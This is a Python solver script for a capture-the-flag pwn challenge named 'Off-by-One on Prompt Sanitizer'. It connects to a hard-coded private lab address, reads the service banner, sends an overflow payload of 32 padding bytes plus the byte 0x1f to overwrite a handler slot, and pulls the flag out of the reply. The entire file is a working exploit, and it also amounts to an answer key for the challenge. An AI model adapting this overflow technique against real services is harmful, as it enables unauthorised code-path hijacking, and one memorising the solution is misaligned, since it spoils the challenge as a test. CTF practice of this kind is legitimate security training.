#!/usr/bin/env python3
"""
Solver for PWN CHALLENGE 2 — Off-by-One on Prompt Sanitizer
"""
import socket
import sys

def solve(host, port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, int(port)))
    s.settimeout(5)

    # Read banner
    data = b''
    while True:
        try:
            chunk = s.recv(4096)
            if not chunk:
                break
            data += chunk
            if b'chars)' in data:
                break
        except socket.timeout:
            break
    print(data.decode(errors='ignore'))

    # Payload: 32 bytes padding + 0x1F (win handler slot)
    payload = b'A' * 32 + b'\x1f\n'
    s.sendall(payload)

    # Read response
    resp = b''
    while True:
        try:
            chunk = s.recv(4096)
            if not chunk:
                break
            resp += chunk
        except socket.timeout:
            break
    s.close()

    output = resp.decode(errors='ignore')
    print(output)

    # Extract flag
    for line in output.split('\n'):
        if 'flag{' in line:
            flag = line[line.index('flag{'):line.index('}') + 1]
            print(f"[+] Flag: {flag}")
            return flag

if __name__ == '__main__':
    host = sys.argv[1] if len(sys.argv) > 1 else '172.31.102.101'
    port = sys.argv[2] if len(sys.argv) > 2 else '10117'
    solve(host, port)
